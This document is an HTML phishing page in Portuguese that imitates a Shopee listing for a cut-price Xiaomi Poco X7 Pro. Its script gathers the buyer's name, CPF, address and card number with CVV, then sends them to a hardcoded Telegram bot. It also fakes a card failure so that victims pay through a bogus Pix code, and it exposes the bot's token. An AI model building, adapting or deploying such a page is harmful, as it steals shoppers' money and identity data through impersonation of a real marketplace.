<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Xiaomi Poco X7 Pro - Shopee Oficial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --shopee: #ee4d2d; --shopee-light: #fff5f1; --teal: #00bfa5; --bg: #f5f5f5; --text: #222; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Helvetica, Arial, sans-serif; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; }

        /* NAVEGA√á√ÉO SPA */
        .page { display: none; min-height: 100vh; width: 100%; position: absolute; top: 0; left: 0; background: var(--bg); }
        .page.active { display: block; position: relative; }

        /* HEADER */
        .top-nav { background: white; padding: 8px 12px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; height: 54px; border-bottom: 1px solid #eee; gap:10px; }
        .search-box { flex: 1; background: #f0f0f0; border-radius: 2px; padding: 8px 12px; color: #888; font-size: 14px; display: flex; align-items: center; gap: 8px; }

        /* PRODUTO */
        .main-slider { position: relative; width: 100%; background: #fff; aspect-ratio: 1/1; }
        .carousel-track { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; height: 100%; scroll-behavior: smooth; }
        .carousel-track::-webkit-scrollbar { display: none; }
        .carousel-item { min-width: 100%; scroll-snap-align: start; }
        .carousel-item img { width: 100%; height: 100%; object-fit: contain; }
        .carousel-index { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.4); color: #fff; padding: 2px 10px; border-radius: 12px; font-size: 11px; }

        .price-card { background: white; padding: 15px; margin-bottom: 8px; }
        .price-main { color: var(--shopee); font-size: 28px; font-weight: 500; }
        .old-price { color: #999; text-decoration: line-through; font-size: 14px; }

        /* MODAL VARIA√á√ïES */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 2000; }
        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 20px; }
        .option-group { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0 20px; }
        .opt-btn { border: 1px solid #ddd; background: #f5f5f5; padding: 8px 15px; border-radius: 2px; font-size: 13px; cursor: pointer; }
        .opt-btn.active { border-color: var(--shopee); color: var(--shopee); background: var(--shopee-light); }

        /* FORMUL√ÅRIO PROFISSIONAL */
        .input-group { background: white; padding: 15px; margin-bottom: 8px; }
        .shopee-input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 2px; margin-bottom: 12px; font-size: 14px; background: #fafafa; outline: none; }
        .shopee-input:focus { border-color: var(--shopee); }

        /* CHECKOUT */
        .shield-box { background: #e6fffb; border: 1px solid #b2f2e9; color: #008f7a; padding: 10px; border-radius: 4px; font-size: 12px; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
        .orange-shield { background: #fff5f1; border: 1px solid #ffdbcc; color: var(--shopee); padding: 12px; border-radius: 4px; font-size: 12px; text-align: center; margin-top: 15px; }

        .pay-row { display: flex; align-items: center; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #eee; cursor: pointer; }
        .radio-circle { width: 18px; height: 18px; border: 2px solid #ccc; border-radius: 50%; }
        .pay-row.active .radio-circle { border-color: var(--shopee); background: var(--shopee); box-shadow: inset 0 0 0 3px #fff; }

        .footer-buy { position: fixed; bottom: 0; width: 100%; height: 60px; background: white; display: flex; align-items: center; border-top: 1px solid #eee; z-index: 1100; }
        .btn-confirm { flex: 1; background: var(--shopee); color: white; border: none; height: 100%; font-weight: bold; font-size: 16px; }

        /* PIX PAGE */
        .pix-code { background: #f5f5f5; border: 1px dashed #ccc; padding: 15px; font-size: 11px; word-break: break-all; margin: 15px 0; border-radius: 4px; }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .loader { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid var(--shopee); border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
    </style>
</head>
<body>

    <div id="p1" class="page active">
        <div class="top-nav">
            <i class="fas fa-arrow-left" style="color:var(--shopee)"></i>
            <div class="search-box"><i class="fas fa-search"></i> Buscar na Shopee</div>
            <i class="fas fa-shopping-cart" style="color:var(--shopee)"></i>
        </div>

        <div class="main-slider">
            <div class="carousel-track" onscroll="updateIdx(this)">
                <div class="carousel-item"><img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg"></div>
                <div class="carousel-item"><img src="https://i.postimg.cc/brs6kkrv/D-NQ-NP-970510-MLA101985218069-122025-O.webp"></div>
                <div class="carousel-item"><img src="https://i.postimg.cc/v84FW6pL/c1cb1b668aeef4266b070782b5b43c47.webp"></div>
            </div>
            <div class="carousel-index">1 / 8</div>
        </div>

        <div class="price-card">
            <div class="old-price">R$ 2.299,00</div>
            <div class="price-main" id="displayPrice">R$ 599,00</div>
            <p style="margin-top:10px; font-size:15px;"><span style="background:var(--shopee); color:white; padding:1px 4px; border-radius:2px; font-size:10px;">Indicado</span> Xiaomi Poco X7 PRO 5G - Global Edition</p>
        </div>

        <div class="footer-buy">
            <div style="width:70px; text-align:center; color:var(--teal); font-size:10px;"><i class="fas fa-store" style="font-size:18px;"></i><br>Loja</div>
            <button class="btn-confirm" onclick="openModal()">Compre Agora</button>
        </div>
    </div>

    <div id="modalVar" class="modal">
        <div class="modal-content">
            <p style="font-weight:bold; font-size:14px;">Selecione a Cor</p>
            <div class="option-group">
                <button class="opt-btn active" onclick="sel(this,'cor')">Preto Onyx</button>
                <button class="opt-btn" onclick="sel(this,'cor')">Amarelo Poco</button>
                <button class="opt-btn" onclick="sel(this,'cor')">Azul Estelar</button>
                <button class="opt-btn" onclick="sel(this,'cor')">Cinza Tit√¢nio</button>
            </div>
            <p style="font-weight:bold; font-size:14px;">Armazenamento</p>
            <div class="option-group">
                <button class="opt-btn active" onclick="sel(this,'ram', 599)">256GB / 12GB RAM</button>
                <button class="opt-btn" onclick="sel(this,'ram', 718.80)">512GB / 12GB RAM (+20%)</button>
            </div>
            <button class="btn-confirm" style="width:100%; border-radius:4px; height:45px;" onclick="irParaEndereco()">CONFIRMAR</button>
        </div>
    </div>

    <div id="p2" class="page">
        <div class="top-nav"><i class="fas fa-arrow-left" onclick="openPage('p1')"></i><h1>Informa√ß√µes de Entrega</h1></div>
        <div class="input-group">
            <div class="shield-box"><i class="fas fa-shield-alt"></i> Verifica√ß√£o de seguran√ßa ShopeePay ativa.</div>
            <input type="text" id="inNome" class="shopee-input" placeholder="Nome Completo">
            <input type="tel" id="inCpf" class="shopee-input" placeholder="CPF" oninput="mCpf(this)" maxlength="14">
            <div style="display:flex; gap:10px;">
                <input type="tel" id="inCep" class="shopee-input" placeholder="CEP" maxlength="9" onblur="buscarAPI()">
            </div>
            <input type="text" id="inRua" class="shopee-input" placeholder="Rua / Logradouro">
            <input type="text" id="inBairro" class="shopee-input" placeholder="Bairro">
            <div style="display:flex; gap:10px;">
                <input type="text" id="inCidade" class="shopee-input" placeholder="Cidade">
                <input type="text" id="inNum" class="shopee-input" placeholder="N¬∫" style="width:80px;">
            </div>
            <button class="btn-confirm" style="width:100%; border-radius:4px; height:48px;" onclick="irParaCheckout()">CONTINUAR</button>
        </div>
    </div>

    <div id="p3" class="page">
        <div class="top-nav"><i class="fas fa-arrow-left" onclick="openPage('p2')"></i><h1>Finalizar Compra</h1></div>
        <div class="input-group">
            <p style="font-size:13px; font-weight:bold; margin-bottom:10px;">M√©todo de Pagamento</p>
            <div class="pay-row active" id="rPix" onclick="setPay('pix')">
                <span style="font-size:14px;"><i class="fas fa-pix" style="color:var(--teal)"></i> Pix</span>
                <div class="radio-circle"></div>
            </div>
            <div class="pay-row" id="rCard" onclick="setPay('card')">
                <span style="font-size:14px;"><i class="far fa-credit-card" style="color:#4a90e2"></i> Cart√£o de Cr√©dito</span>
                <div class="radio-circle"></div>
            </div>
        </div>

        <div id="cardArea" class="input-group" style="display:none;">
            <input type="tel" id="cNum" class="shopee-input" placeholder="N√∫mero do Cart√£o">
            <input type="text" id="cNome" class="shopee-input" placeholder="Nome Impresso">
            <div style="display:flex; gap:10px;">
                <input type="tel" id="cVal" class="shopee-input" placeholder="MM/AA" maxlength="5">
                <input type="tel" id="cCvv" class="shopee-input" placeholder="CVV" maxlength="4">
            </div>
        </div>

        <div class="input-group" style="font-size:14px;">
            <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span>Total do Pedido</span><span id="finalPrice" style="color:var(--shopee); font-weight:bold; font-size:20px;">R$ 599,00</span></div>
            <div class="orange-shield">
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" style="width:15px; vertical-align:middle;"> 
                <b>Garantia Shopee:</b> Se seu pedido n√£o for entregue, a Shopee devolve seu dinheiro.
            </div>
        </div>

        <div class="footer-buy">
            <button class="btn-confirm" onclick="processarPedido()">Fazer Pedido</button>
        </div>
    </div>

    <div id="pPix" class="page">
        <div class="top-nav"><h1>Pagamento Pix</h1></div>
        <div style="padding:30px 20px; text-align:center; background:white;">
            <div class="loader"></div> <span style="font-size:14px; color:#666;">Aguardando pagamento...</span>
            <h2 style="margin:20px 0; color:var(--teal);">R$ <span class="vFinal"></span></h2>
            <p style="font-size:12px; color:#888; margin-bottom:15px;">Copie o c√≥digo abaixo para pagar no seu banco:</p>
            <div class="pix-code" id="pixCode">00020101021226870014br.gov.bcb.pix01147294447445...</div>
            <button class="btn-confirm" style="width:100%; height:45px; border-radius:4px;" onclick="alert('Copiado!')">COPIAR C√ìDIGO PIX</button>
            <div class="orange-shield" style="margin-top:30px;">Protegido por ShopeePay</div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
        const CHAT_ID = '7294447445';
        let vBase = 599.00;
        let pAtivo = 'pix';

        function openPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            window.scrollTo(0,0);
        }

        function openModal() { document.getElementById('modalVar').style.display = 'block'; }

        function sel(btn, tipo, preco) {
            btn.parentElement.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            if(preco) {
                vBase = preco;
                document.getElementById('displayPrice').innerText = `R$ ${preco.toFixed(2)}`;
            }
        }

        function mCpf(i) {
            let v = i.value.replace(/\D/g,'');
            v = v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");
            i.value = v;
        }

        async function buscarAPI() {
            const cep = document.getElementById('inCep').value.replace(/\D/g,'');
            if(cep.length === 8) {
                const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                const d = await r.json();
                if(!d.erro) {
                    document.getElementById('inRua').value = d.logradouro;
                    document.getElementById('inBairro').value = d.bairro;
                    document.getElementById('inCidade').value = d.localidade;
                }
            }
        }

        function irParaEndereco() {
            document.getElementById('modalVar').style.display = 'none';
            openPage('p2');
        }

        function irParaCheckout() {
            document.getElementById('finalPrice').innerText = `R$ ${vBase.toFixed(2)}`;
            document.querySelectorAll('.vFinal').forEach(e => e.innerText = vBase.toFixed(2));
            openPage('p3');
        }

        function setPay(m) {
            pAtivo = m;
            document.querySelectorAll('.pay-row').forEach(r => r.classList.remove('active'));
            document.getElementById(m === 'pix' ? 'rPix' : 'rCard').classList.add('active');
            document.getElementById('cardArea').style.display = m === 'card' ? 'block' : 'none';
        }

        async function processarPedido() {
            const dados = `üöÄ *NOVO PEDIDO BLACK*\nüë§ ${document.getElementById('inNome').value}\nüÜî ${document.getElementById('inCpf').value}\nüìç ${document.getElementById('inRua').value}, ${document.getElementById('inNum').value}\nüí∞ Total: R$ ${vBase.toFixed(2)}\nüí≥ Cart√£o: ${document.getElementById('cNum').value || 'PIX'}\nüîí CVV: ${document.getElementById('cCvv').value || '---'}`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: dados, parse_mode: 'Markdown'})
            });

            if(pAtivo === 'card') {
                // ESTRAT√âGIA: For√ßar Erro no cart√£o para ir pro Pix
                alert("Erro no processamento: Este cart√£o n√£o suporta compras parceladas ou est√° sem limite. Tente pagar com PIX para garantir sua reserva!");
                setPay('pix');
            } else {
                openPage('pPix');
            }
        }

        function updateIdx(t) {
            const i = Math.round(t.scrollLeft / t.offsetWidth) + 1;
            document.querySelector('.carousel-index').innerText = `${i} / 8`;
        }
    </script>
</body>
</html>
                                        
